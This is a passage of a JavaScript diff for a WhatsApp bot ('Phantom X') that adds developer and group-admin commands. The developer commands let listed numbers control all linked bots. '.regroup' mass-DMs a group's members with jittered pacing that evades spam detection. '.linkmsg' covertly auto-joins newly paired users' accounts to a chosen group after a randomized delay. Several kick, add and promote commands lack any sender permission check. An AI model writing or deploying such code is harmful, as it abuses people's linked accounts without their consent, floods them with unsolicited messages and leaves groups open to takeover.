+                    try { sock.end(new Error("Manual restart requested")); }
+                    catch (_) { try { sock.ws?.close(); } catch (_) {} }
+                }, 1000);
+                break;
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ DEVELOPER CONTROL COMMANDS ░░░░░
+            // ════════════════════════════════════════
+
+            // --- UNLEASH — grant command access ---
+            // .unleash allcmds               → everyone gets all cmds
+            // .unleash allcmds <number>       → specific number gets all cmds
+            // .unleash <cmd> all              → specific cmd open to everyone
+            // .unleash <cmd> <number>         → specific cmd for specific number
+            case ".unleash": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const uCmd = parts[1]?.toLowerCase();
+                const uTarget = parts[2]?.replace(/\D/g, "") || "all";
+                if (!uCmd) return reply(
+                    `🔓 *Unleash Command*\n\n` +
+                    `Usage:\n` +
+                    `• *.unleash allcmds* — open all cmds to everyone\n` +
+                    `• *.unleash allcmds <number>* — give a number full access\n` +
+                    `• *.unleash <cmd> all* — open one cmd to everyone\n` +
+                    `• *.unleash <cmd> <number>* — open one cmd to one number\n\n` +
+                    `Example: *.unleash .pltable 2348012345678*`
+                );
+                if (uCmd === "allcmds" && (uTarget === "all" || !parts[2])) {
+                    const data = loadPremium(); data.global_unlock = true; savePremium(data);
+                    return reply(`✅ *All commands are now open to everyone.*\nPhantom X is in full public mode.`);
+                }
+                const cmdKey = uCmd.startsWith(".") ? uCmd : `.${uCmd}`;
+                unleashCmd(cmdKey === ".allcmds" ? "allcmds" : cmdKey, uTarget);
+                const targetLabel = uTarget === "all" ? "everyone" : `+${uTarget}`;
+                return reply(`✅ *Unleashed ${cmdKey === ".allcmds" ? "all commands" : cmdKey}* for *${targetLabel}*.`);
+            }
+
+            // --- CMDLOCK — revoke access ---
+            // .cmdlock allcmds    → re-lock everything (back to premium-only)
+            // .cmdlock <cmd>      → re-lock a specific cmd
+            case ".cmdlock": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const lCmd = parts[1]?.toLowerCase();
+                if (!lCmd) return reply(
+                    `🔒 *Lock Command*\n\n` +
+                    `• *.cmdlock allcmds* — re-lock everything\n` +
+                    `• *.cmdlock <cmd>* — re-lock one command\n\n` +
+                    `Example: *.cmdlock .pltable*`
+                );
+                lockCmd(lCmd);
+                return reply(`🔒 *${lCmd === "allcmds" ? "All commands re-locked." : `${lCmd} is now locked again.`}*\nOnly premium users can access it.`);
+            }
+
+            // --- LOCKFOR — block a specific cmd for a specific number, even if premium ---
+            // .lockfor <number> <cmd>       → block that cmd for that number
+            // .lockfor <number> allcmds     → block ALL cmds for that number
+            case ".lockfor": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const lfNum = (parts[1] || "").replace(/\D/g, "");
+                const lfCmd = (parts[2] || "").toLowerCase();
+                if (!lfNum || !lfCmd) return reply(
+                    `🔒 *Lock For Command*\n\n` +
+                    `Block a specific command for a specific number (overrides premium).\n\n` +
+                    `Usage:\n` +
+                    `• *.lockfor <number> <cmd>* — block one cmd for that number\n` +
+                    `• *.lockfor <number> allcmds* — block ALL cmds for that number\n\n` +
+                    `Example: *.lockfor 2348012345678 .clone*`
+                );
+                const lfKey = lfCmd.startsWith(".") ? lfCmd : (lfCmd === "allcmds" ? "allcmds" : `.${lfCmd}`);
+                setLockedFor(lfNum, lfCmd === "allcmds" ? "allcmds" : lfKey, true);
+                return reply(`🔒 *+${lfNum}* is now blocked from *${lfKey === "allcmds" ? "ALL commands" : lfKey}*.\nThis overrides their premium status.`);
+            }
+
+            // --- UNLOCKFOR — remove a per-number block ---
+            case ".unlockfor": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const ufNum = (parts[1] || "").replace(/\D/g, "");
+                const ufCmd = (parts[2] || "").toLowerCase();
+                if (!ufNum || !ufCmd) return reply(
+                    `🔓 *Unlock For Command*\n\n` +
+                    `Remove a specific block from a number.\n\n` +
+                    `Usage:\n` +
+                    `• *.unlockfor <number> <cmd>* — remove block for one cmd\n` +
+                    `• *.unlockfor <number> allcmds* — remove the allcmds block\n\n` +
+                    `Example: *.unlockfor 2348012345678 .clone*`
+                );
+                const ufKey = ufCmd.startsWith(".") ? ufCmd : (ufCmd === "allcmds" ? "allcmds" : `.${ufCmd}`);
+                setLockedFor(ufNum, ufCmd === "allcmds" ? "allcmds" : ufKey, false);
+                return reply(`✅ Block removed. *+${ufNum}* can now access *${ufKey === "allcmds" ? "all commands" : ufKey}* again (if premium).`);
+            }
+
+            // --- PREMIUM ADD/REMOVE individual numbers ---
+            case ".premiumadd": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const paNum = (parts[1] || "").replace(/\D/g, "");
+                if (!paNum) return reply("Usage: .premiumadd <number>\nExample: .premiumadd 2348012345678");
+                setPremiumNumber(paNum, true);
+                return reply(`✅ *+${paNum}* added to premium list.\nThey now have full access to all commands.`);
+            }
+            case ".premiumremove": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const prNum = (parts[1] || "").replace(/\D/g, "");
+                if (!prNum) return reply("Usage: .premiumremove <number>\nExample: .premiumremove 2348012345678");
+                setPremiumNumber(prNum, false);
+                return reply(`✅ *+${prNum}* removed from premium list.`);
+            }
+            case ".premiumlist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const pd = loadPremium();
+                const globalUnlock = pd.global_unlock ? "✅ YES — all cmds open to everyone" : "❌ No";
+                const premNums = (pd.premium_numbers || []).map(n => `  • +${n}`).join("\n") || "  _None_";
+                const unlocked = pd.unlocked_cmds || {};
+                let unlockedLines = "";
+                for (const [cmd, val] of Object.entries(unlocked)) {
+                    const tgt = val === "all" ? "everyone" : (Array.isArray(val) ? val.map(n => `+${n}`).join(", ") : val);
+                    unlockedLines += `  • ${cmd} → ${tgt}\n`;
+                }
+                return reply(
+                    `💎 *Premium Status*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `🌍 *Global unlock:* ${globalUnlock}\n\n` +
+                    `👥 *Premium numbers:*\n${premNums}\n\n` +
+                    `🔓 *Unlocked commands:*\n${unlockedLines || "  _None_"}`
+                );
+            }
+
+            // --- ADDDEV / REMOVEDEV — add/remove a runtime dev number ---
+            case ".adddev": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const adNum = (parts[1] || "").replace(/\D/g, "");
+                if (!adNum || adNum.length < 7) return reply("Usage: .adddev <number>\nExample: .adddev 2348012345678");
+                const devs = loadExtraDevs();
+                if (!devs.includes(adNum)) { devs.push(adNum); saveExtraDevs(devs); }
+                return reply(`✅ *+${adNum}* is now a developer.\nThey have full dev access to all commands on all bots.`);
+            }
+            case ".removedev": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const rdNum = (parts[1] || "").replace(/\D/g, "");
+                if (!rdNum) return reply("Usage: .removedev <number>");
+                const devs = loadExtraDevs().filter(n => n !== rdNum);
+                saveExtraDevs(devs);
+                return reply(`✅ *+${rdNum}* removed from developer list.`);
+            }
+            case ".devlist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const allDevs = [...DEV_NUMBERS, ...loadExtraDevs()];
+                return reply(`👨‍💻 *Developer Numbers*\n━━━━━━━━━━━━━━━━━━━━\n\n${allDevs.map((n, i) => `${i === 0 ? "👑" : "🔹"} +${n}${i === 0 ? " _(primary)_" : ""}`).join("\n")}`);
+            }
+
+            // --- REGROUP — slow-roll DM blast to a group's members ---
+            case ".regroup": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const sub = (parts[1] || "").toLowerCase();
+                const rest = parts.slice(2).join(" ").trim();
+                const cfg = loadRegroup();
+
+                if (!sub || sub === "show" || sub === "view") {
+                    return reply(
+                        `📦 *Regroup — Slow Migration Tool*\n━━━━━━━━━━━━━━━━━━━━\n` +
+                        `Active job:    ${cfg.active ? `🟢 in group ${cfg.active.group} (${cfg.active.sent}/${cfg.active.total})` : "—"}\n` +
+                        `Group link:    ${cfg.groupLink || "_(not set)_"}\n` +
+                        `Per-msg delay: ${cfg.perMessageDelaySeconds}s\n` +
+                        `Jitter:        ±${cfg.jitterSeconds}s\n` +
+                        `Skip admins:   ${cfg.skipAdmins ? "yes" : "no"}\n\n` +
+                        `*Message preview:*\n${cfg.text.replace("{LINK}", cfg.groupLink || "<link>")}\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n*Commands:*\n` +
+                        `• *.regroup set <text>* — message body (use {LINK})\n` +
+                        `• *.regroup link <invite>* — destination group link\n` +
+                        `• *.regroup delay <sec>* — pause between DMs\n` +
+                        `• *.regroup jitter <sec>* — random ± per DM\n` +
+                        `• *.regroup skipadmins on/off*\n` +
+                        `• *.regroup start* — run in current group\n` +
+                        `• *.regroup stop* — cancel a running job\n` +
+                        `• *.regroup status* — show progress`
+                    );
+                }
+                if (sub === "set" || sub === "text") {
+                    if (!rest) return reply("Usage: .regroup set <message — use {LINK} where the link should appear>");
+                    cfg.text = rest; saveRegroup(cfg);
+                    return reply(`✅ Regroup text saved.\n\nPreview:\n${rest.replace("{LINK}", cfg.groupLink || "<link>")}`);
+                }
+                if (sub === "link" || sub === "group") {
+                    if (!rest || !/^https?:\/\//i.test(rest)) return reply("Usage: .regroup link <https://chat.whatsapp.com/CODE>");
+                    cfg.groupLink = rest; saveRegroup(cfg);
+                    return reply(`✅ Destination link saved.\n🔗 ${rest}`);
+                }
+                if (sub === "delay") {
+                    const n = parseInt(rest, 10);
+                    if (!n || n < 3 || n > 600) return reply("Usage: .regroup delay <3-600 seconds>");
+                    cfg.perMessageDelaySeconds = n; saveRegroup(cfg);
+                    return reply(`✅ Per-message delay set to ${n}s.`);
+                }
+                if (sub === "jitter") {
+                    const n = parseInt(rest, 10);
+                    if (n === undefined || isNaN(n) || n < 0 || n > 300) return reply("Usage: .regroup jitter <0-300 seconds>");
+                    cfg.jitterSeconds = n; saveRegroup(cfg);
+                    return reply(`✅ Jitter set to ±${n}s.`);
+                }
+                if (sub === "skipadmins") {
+                    if (!["on", "off"].includes(rest.toLowerCase())) return reply("Usage: .regroup skipadmins on/off");
+                    cfg.skipAdmins = rest.toLowerCase() === "on"; saveRegroup(cfg);
+                    return reply(`✅ Skip admins: ${cfg.skipAdmins ? "ON" : "OFF"}.`);
+                }
+                if (sub === "stop") {
+                    if (!cfg.active) return reply("ℹ️ No active regroup job.");
+                    cfg.active.cancelled = true; saveRegroup(cfg);
+                    return reply("🛑 Regroup will stop after the current message.");
+                }
+                if (sub === "status") {
+                    if (!cfg.active) return reply("ℹ️ No active regroup job.");
+                    return reply(`📊 In group ${cfg.active.group}\nSent: ${cfg.active.sent}/${cfg.active.total}\nFailed: ${cfg.active.failed || 0}`);
+                }
+                if (sub === "start") {
+                    if (!isGroup) return reply("Run this from the source group you want to migrate.");
+                    if (!cfg.groupLink) return reply("❌ Set a destination link first: *.regroup link <invite>*");
+                    if (cfg.active) return reply("⚠️ A regroup job is already running. Use *.regroup stop* first.");
+                    const meta = await sock.groupMetadata(from);
+                    const adminSet = new Set(meta.participants.filter(p => p.admin).map(p => p.id));
+                    const ownNum = (sock.user?.id || "").split(":")[0].split("@")[0];
+                    const targets = meta.participants
+                        .map(p => p.id)
+                        .filter(j => j.split("@")[0] !== ownNum)
+                        .filter(j => !cfg.skipAdmins || !adminSet.has(j));
+                    if (!targets.length) return reply("ℹ️ No eligible members to message.");
+                    cfg.active = { group: from, total: targets.length, sent: 0, failed: 0, cancelled: false, startedAt: Date.now() };
+                    saveRegroup(cfg);
+                    await reply(`🚀 Regroup started → DMing ${targets.length} member(s).\nPace: ${cfg.perMessageDelaySeconds}s ±${cfg.jitterSeconds}s.\nTrack with *.regroup status*.`);
+                    (async () => {
+                        for (let i = 0; i < targets.length; i++) {
+                            const cur = loadRegroup();
+                            if (!cur.active || cur.active.cancelled) break;
+                            const jid = targets[i];
+                            const body = (cur.text || "").replace(/\{LINK\}/g, cur.groupLink || "");
+                            try {
+                                await sock.sendMessage(jid, { text: body });
+                                cur.active.sent = (cur.active.sent || 0) + 1;
+                            } catch (e) {
+                                cur.active.failed = (cur.active.failed || 0) + 1;
+                                console.log(`[regroup] fail ${jid}: ${e?.message}`);
+                            }
+                            saveRegroup(cur);
+                            const baseMs = cur.perMessageDelaySeconds * 1000;
+                            const jit = cur.jitterSeconds > 0 ? Math.floor((Math.random() * 2 - 1) * cur.jitterSeconds * 1000) : 0;
+                            await new Promise(r => setTimeout(r, Math.max(1500, baseMs + jit)));
+                        }
+                        const fin = loadRegroup();
+                        const wasCancelled = fin.active?.cancelled;
+                        try {
+                            await sock.sendMessage(from, { text: `${wasCancelled ? "🛑 *Regroup cancelled.*" : "✅ *Regroup complete.*"}\nSent: ${fin.active?.sent || 0} • Failed: ${fin.active?.failed || 0} / ${fin.active?.total || 0}` });
+                        } catch {}
+                        fin.active = null; saveRegroup(fin);
+                    })();
+                    return;
+                }
+                return reply("Unknown option. Send *.regroup* to see all options.");
+            }
+
+            // --- LINK WELCOME / AUTO-JOIN ---
+            case ".linkmsg": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const sub = (parts[1] || "").toLowerCase();
+                const rest = parts.slice(2).join(" ").trim();
+                const cfg = loadLinkWelcome();
+
+                // Helper: parse "7h", "30m", "45" (defaults to minutes)
+                function parseDur(s, unit) {
+                    if (!s) return null;
+                    const m = String(s).match(/^(\d+(?:\.\d+)?)\s*(h|m|s)?$/i);
+                    if (!m) return null;
+                    const n = parseFloat(m[1]);
+                    const u = (m[2] || unit).toLowerCase();
+                    if (u === "h") return n;          // hours
+                    if (u === "m") return n / 60;     // minutes -> hours
+                    if (u === "s") return n / 3600;
+                    return n;
+                }
+
+                if (!sub || sub === "show" || sub === "view") {
+                    const pending = loadPendingJoins();
+                    return reply(
+                        `📬 *Auto-Welcome / Auto-Join*\n━━━━━━━━━━━━━━━━━━━━\n` +
+                        `Status:      ${cfg.enabled ? "🟢 ON" : "🔴 OFF"}\n` +
+                        `Auto-join:   ${cfg.autoJoin ? "✅ yes" : "❌ no"}\n` +
+                        `Delay:       ${cfg.delayHours}h\n` +
+                        `Jitter:      ±${cfg.jitterMinutes}m\n` +
+                        `Group link:  ${cfg.groupLink || "_(not set)_"}\n` +
+                        `Invite code: ${extractInviteCode(cfg.groupLink) || "_(none)_"}\n` +
+                        `In-flight:   ${pending.length} pending\n\n` +
+                        `*Welcome preview:*\n${cfg.text}${cfg.groupLink ? `\n\n🔗 ${cfg.groupLink}` : ""}\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n*Commands:*\n` +
+                        `• *.linkmsg on / off* — enable / disable\n` +
+                        `• *.linkmsg set <text>* — welcome text\n` +
+                        `• *.linkmsg group <link>* — community group link\n` +
+                        `• *.linkmsg clear* — remove group link\n` +
+                        `• *.linkmsg delay <e.g. 7h, 90m>* — wait before action\n` +
+                        `• *.linkmsg jitter <e.g. 30m>* — random ± window\n` +
+                        `• *.linkmsg autojoin on/off* — actually join the group\n` +
+                        `• *.linkmsg test* — DM yourself now\n` +
+                        `• *.linkmsg testjoin* — try the group join now\n` +
+                        `• *.linkmsg pending* — list scheduled joins\n` +
+                        `• *.linkmsg cancel* — cancel scheduled joins`
+                    );
+                }
+                if (sub === "on" || sub === "enable") {
+                    cfg.enabled = true; saveLinkWelcome(cfg);
+                    return reply(`✅ *ON.* New pairings will be DM'd & ${cfg.autoJoin ? "auto-joined" : "notified"} after ${cfg.delayHours}h ±${cfg.jitterMinutes}m.`);
+                }
+                if (sub === "off" || sub === "disable") {
+                    cfg.enabled = false; saveLinkWelcome(cfg);
+                    return reply("🔴 *OFF.* New pairings will not be welcomed or auto-joined.");
+                }
+                if (sub === "set" || sub === "text") {
+                    if (!rest) return reply("Usage: .linkmsg set <welcome text>");
+                    cfg.text = rest; saveLinkWelcome(cfg);
+                    return reply(`✅ Welcome text updated.\n\nPreview:\n${rest}`);
+                }
+                if (sub === "group" || sub === "link") {
+                    if (!rest) return reply("Usage: .linkmsg group <https://chat.whatsapp.com/CODE>");
+                    if (!extractInviteCode(rest)) return reply("❌ That doesn't look like a valid WhatsApp group invite link.");
+                    cfg.groupLink = rest; saveLinkWelcome(cfg);
+                    return reply(`✅ Group link saved.\n🔗 ${rest}\nInvite code: ${extractInviteCode(rest)}`);
+                }
+                if (sub === "clear" || sub === "remove") {
+                    cfg.groupLink = ""; saveLinkWelcome(cfg);
+                    return reply("✅ Group link cleared.");
+                }
+                if (sub === "delay") {
+                    const h = parseDur(rest, "h");
+                    if (h === null || h < 0 || h > 168) return reply("Usage: .linkmsg delay <duration>\nExamples: 7h, 90m, 30s, 0 (instant). Max 168h.");
+                    cfg.delayHours = h; saveLinkWelcome(cfg);
+                    return reply(`✅ Delay set to *${h}h* (${Math.round(h*60)}m).`);
+                }
+                if (sub === "jitter") {
+                    const h = parseDur(rest, "m");
+                    if (h === null || h < 0 || h > 12) return reply("Usage: .linkmsg jitter <duration>\nExamples: 30m, 1h, 0 (no jitter).");
+                    cfg.jitterMinutes = Math.round(h * 60); saveLinkWelcome(cfg);
+                    return reply(`✅ Jitter set to *±${cfg.jitterMinutes}m*.`);
+                }
+                if (sub === "autojoin") {
+                    const v = (rest || "").toLowerCase();
+                    if (!["on", "off"].includes(v)) return reply("Usage: .linkmsg autojoin on/off");
+                    cfg.autoJoin = v === "on"; saveLinkWelcome(cfg);
+                    return reply(`✅ Auto-join is now *${cfg.autoJoin ? "ON" : "OFF"}*.`);
+                }
+                if (sub === "test") {
+                    const preview = buildLinkWelcomeMessage();
+                    if (!preview) return reply("⚠️ Currently OFF. Run *.linkmsg on* first.");
+                    try { await sock.sendMessage(senderJid, { text: preview }); return reply("✅ Test welcome DM sent."); }
+                    catch (e) { return reply(`❌ ${e?.message}`); }
+                }
+                if (sub === "testjoin") {
+                    const code = extractInviteCode(cfg.groupLink);
+                    if (!code) return reply("❌ No group link configured.");
+                    try { await sock.groupAcceptInvite(code); return reply("✅ Joined (or already a member)."); }
+                    catch (e) { return reply(`❌ Join failed: ${e?.message}`); }
+                }
+                if (sub === "pending" || sub === "queue") {
+                    const list = loadPendingJoins();
+                    if (!list.length) return reply("📭 No pending joins.");
+                    const now = Date.now();
+                    let out = `⏳ *Pending Auto-Joins (${list.length})*\n━━━━━━━━━━━━━━\n`;
+                    list.forEach(e => {
+                        const min = Math.round((e.fireAt - now) / 60000);
+                        out += `• user ${e.userId} → in ${min}m\n`;
+                    });
+                    return reply(out);
+                }
+                if (sub === "cancel") {
+                    const list = loadPendingJoins();
+                    savePendingJoins([]);
+                    return reply(`🗑️ Cleared ${list.length} pending join(s). (Existing timers will no-op.)`);
+                }
+                return reply("Unknown option. Send *.linkmsg* to see all options.");
+            }
+
+            // --- SILENCENUMBER — dev silences a number from a specific linked bot ---
+            case ".silencenumber":
+            case ".silence": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const snNum = (parts[1] || "").replace(/\D/g, "");
+                if (!snNum) return reply(
+                    `🔇 *Silence Number*\n\n` +
+                    `Usage: *.silencenumber <number>*\n` +
+                    `Example: *.silencenumber 2348012345678*\n\n` +
+                    `_The bot linked to this WhatsApp will completely ignore that number._\n` +
+                    `_Other bots are not affected._`
+                );
+                addSilenced(botJid, snNum);
+                return reply(`🔇 *+${snNum}* has been silenced on this bot.\nThey will send commands but this bot will not respond to them at all.`);
+            }
+            case ".unsilencenumber":
+            case ".unsilence": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const unsnNum = (parts[1] || "").replace(/\D/g, "");
+                if (!unsnNum) return reply("Usage: .unsilencenumber <number>");
+                removeSilenced(botJid, unsnNum);
+                return reply(`🔊 *+${unsnNum}* has been unsilenced. This bot will respond to them again.`);
+            }
+            case ".silencelist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
+                const sl = loadSilenced();
+                const slList = sl[botJid || "global"] || [];
+                if (!slList.length) return reply("🔊 No numbers are currently silenced on this bot.");
+                return reply(`🔇 *Silenced Numbers (this bot)*\n━━━━━━━━━━━━━━━━━━━━\n\n${slList.map(n => `  • +${n}`).join("\n")}\n\n_Use .unsilencenumber <number> to restore._`);
+            }
+
+            case ".numinfo":
+            case ".numberinfo":
+            case ".targetloc":
+            case ".targetlocation":
+            case ".locate": {
+                const input = parts[1] || (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || "").split("@")[0];
+                const info = lookupPhoneNumberInfo(input);
+                if (!info) return reply("Usage: .numinfo 2348012345678\n\nThis shows country/prefix info only, not live GPS location.");
+                await reply(
+                    `📍 *Number Info*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `• Number: *${info.international}*\n` +
+                    `• Country: *${info.countryName}* (${info.countryCode})\n` +
+                    `• Calling code: *+${info.callingCode}*\n` +
+                    `• Local prefix: *${info.localPrefix}*\n` +
+                    `• Carrier guess: *${info.carrier}*\n\n` +
+                    `_Note: this is based on phone prefix/public numbering data. It cannot show live/real GPS location._`
+                );
+                break;
+            }
+
+            // --- GROUP ADMIN COMMANDS ---
+            case ".add": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const addTarget = resolveTargetJid(msg, parts);
+                if (!addTarget) return reply(eclipseSay("bad_use") + "\nuse: .add <number> or reply to their message with .add");
+                const jid = addTarget;
+                await sock.groupParticipantsUpdate(from, [jid], "add");
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *VESSEL_INTEGRATION* █▓▒░\n\n` +
+                    `   [ 📂 ] *TARGET* : +${addTarget.split("@")[0]}\n` +
+                    `   [ ⚡ ] *ACTION* : FORCED_ENTRY\n` +
+                    `   [ 🛠️ ] *RESULT* : SYNC_COMPLETE\n\n` +
+                    `   " *The doors have opened.*\n     *Another shadow joins the*\n     *collective. Survival starts*\n     *now.* "`
+                ));
+                break;
+            }
+
+            case ".kick": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const kickTarget = resolveTargetJid(msg, parts);
+                const kickTargets = kickTarget ? [kickTarget] : (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []);
+                if (!kickTargets.length) return reply(eclipseSay("bad_use") + "\nuse: .kick @user, .kick <number>, or reply to their message with .kick");
+                await sock.groupParticipantsUpdate(from, kickTargets, "remove");
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *VESSEL_EXPULSION* █▓▒░\n\n` +
+                    `   [ ⚡ ] *ACTION* : REMOVE\n` +
+                    `   [ 🛠️ ] *RESULT* : CAST_OUT\n\n` +
+                    `   " *The void has spoken.*\n     *The unwanted are gone.* "`
+                ));
+                break;
+            }
+
+            case ".promote": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const promoteTarget = resolveTargetJid(msg, parts);
+                const promoteTargets = promoteTarget ? [promoteTarget] : (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []);
+                if (!promoteTargets.length) return reply(eclipseSay("bad_use") + "\nuse: .promote @user, .promote <number>, or reply to their message with .promote");
+                await sock.groupParticipantsUpdate(from, promoteTargets, "promote");
+                const mentionTagsPro = promoteTargets.map(j => `@${j.split("@")[0]}`).join(", ");
+                await sock.sendMessage(from, { text: buildOmegaTerminal(
+                    `      ◢◤ *RANK_RECALIBRATION* ◢◤\n\n` +
+                    `      👤 *USER* : ${mentionTagsPro}\n` +
+                    `      📊 *OLD_RANK* : [ MEMBER ]\n` +
+                    `      📈 *NEW_RANK* : [ ADMINISTRATOR ]\n\n` +
+                    `   " *Power is a gift I can*\n     *grant... and a burden I*\n     *can strip away in a*\n     *single heartbeat.* "`
+                ), mentions: promoteTargets }, { quoted: msg });
+                break;
+            }
+
+            case ".demote": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const demoteTarget = resolveTargetJid(msg, parts);
+                const demoteTargets = demoteTarget ? [demoteTarget] : (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []);
+                if (!demoteTargets.length) return reply(eclipseSay("bad_use") + "\nuse: .demote @user, .demote <number>, or reply to their message with .demote");
+                await sock.groupParticipantsUpdate(from, demoteTargets, "demote");
+                const mentionTagsDem = demoteTargets.map(j => `@${j.split("@")[0]}`).join(", ");
+                await sock.sendMessage(from, { text: buildOmegaTerminal(
+                    `      ◢◤ *RANK_RECALIBRATION* ◢◤\n\n` +
+                    `      👤 *USER* : ${mentionTagsDem}\n` +
+                    `      📊 *OLD_RANK* : [ ADMINISTRATOR ]\n` +
+                    `      📉 *NEW_RANK* : [ MEMBER ]\n\n` +
+                    `   " *The throne was temporary.*\n     *As all power is. I have*\n     *taken it back.* "`
+                ), mentions: demoteTargets }, { quoted: msg });
+                break;
+            }
+     
+            case ".link": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const inv = await sock.groupInviteCode(from);
+                savedGroupLinks[from] = inv;
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    groupNames[from] = meta.subject;
+                } catch (_) {}
+                await reply(buildOmegaTerminal(
+                    `   〔 BOND_EXTRACT 〕\n\n` +
+                    `   🔗  LINK   →  ACTIVE\n` +
+                    `   🌐  SCOPE  →  PUBLIC_INVITE\n\n` +
+                    `   https://chat.whatsapp.com/${inv}\n\n` +
+                    `   " The door is open.\n     Who enters is your\n     responsibility now. "`
+                ));
+                break;
+            }
+            case ".revoke": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                await sock.groupRevokeInvite(from);
+                await reply(buildOmegaTerminal(
+                    `   ╾━━━ BOND_SEVERED ━━━╼\n\n` +
+                    `   🔗  OLD LINK  →  DEAD\n` +
+                    `   🔒  NEW LINK  →  GENERATED\n\n` +
+                    `   " The old path is closed.\n     A new bond will form\n     only on your terms. "`
+                ));
+                break;
+            }
+
+            case ".lock": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    const r2 = await getGroupRoles(sock, from);
+                    if (!r2.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                }
+                await sock.groupSettingUpdate(from, "announcement");
+                await reply(buildOmegaTerminal(
+                    `      ┎⊷ 【 🔇 *VOCAL_SEAL* 】\n` +
+                    `      ┃\n` +
+                    `      ┃ 🔒 *STATE* : LOCKED\n` +
+                    `      ┃ 🔊 *INPUT* : ADMINS ONLY\n` +
+                    `      ┃\n` +
+                    `      ┖───────────────────────────╼\n\n` +
+                    `   " *The noise was too much.*\n     *I have imposed a silence*\n     *that only the chosen*\n     *can break.* "`
+                ));
+                break;
+            }
+
+            case ".unlock": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    const r2 = await getGroupRoles(sock, from);
+                    if (!r2.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                }
+                await sock.groupSettingUpdate(from, "not_announcement");
+                await reply(buildOmegaTerminal(
+                    `      ┎⊷ 【 🔊 *VOCAL_SEAL_LIFTED* 】\n` +
+                    `      ┃\n` +
+                    `      ┃ 🔓 *STATE* : UNLOCKED\n` +
+                    `      ┃ 🗣️ *INPUT* : EVERYONE\n` +
+                    `      ┃\n` +
+                    `      ┖───────────────────────────╼\n\n` +
+                    `   " *The silence breaks.*\n     *Speak carefully.*\n     *I am still listening.* "`
+                ));
+                break;
+            }
+
+            // --- MUTE USER (individual silence in a group) ---
+            case ".mute": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    const r2 = await getGroupRoles(sock, from);
+                    if (!r2.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                }
+                const muteTarget = resolveTargetJid(msg, parts);
+                if (!muteTarget) return reply("Usage: .mute @user / .mute <number> / reply to their message with .mute");
+                if (isUserMuted(from, muteTarget)) return reply(`@${muteTarget.split("@")[0]} is already muted.`, { mentions: [muteTarget] });
+                addMutedUser(from, muteTarget);
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   ░▒▓█ *SILENCE_PROTOCOL* █▓▒░\n\n` +
+                        `   [ 🔇 ] *TARGET* : @${muteTarget.split("@")[0]}\n` +
+                        `   [ ⚡ ] *ACTION* : VOCAL_SEAL\n` +
+                        `   [ 🛠️ ] *STATUS* : ACTIVE\n\n` +
+                        `   " *Your voice has been erased.*\n     *The collective will no*\n     *longer hear you.* "`
+                    ), mentions: [muteTarget]
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- UNMUTE USER (remove individual silence) ---
+            case ".unmute": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    const r2 = await getGroupRoles(sock, from);
+                    if (!r2.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                }
+                const unmuteTarget = resolveTargetJid(msg, parts);
+                if (!unmuteTarget) return reply("Usage: .unmute @user / .unmute <number> / reply to their message with .unmute");
+                if (!isUserMuted(from, unmuteTarget)) return reply(`@${unmuteTarget.split("@")[0]} is not currently muted.`, { mentions: [unmuteTarget] });
+                removeMutedUser(from, unmuteTarget);
+                await sock.sendMessage(from, {
+                    text: buildOmegaTerminal(
+                        `   ░▒▓█ *SILENCE_LIFTED* █▓▒░\n\n` +
+                        `   [ 🔊 ] *TARGET* : @${unmuteTarget.split("@")[0]}\n` +
+                        `   [ ⚡ ] *ACTION* : VOCAL_RESTORE\n` +
+                        `   [ 🛠️ ] *STATUS* : RELEASED\n\n` +
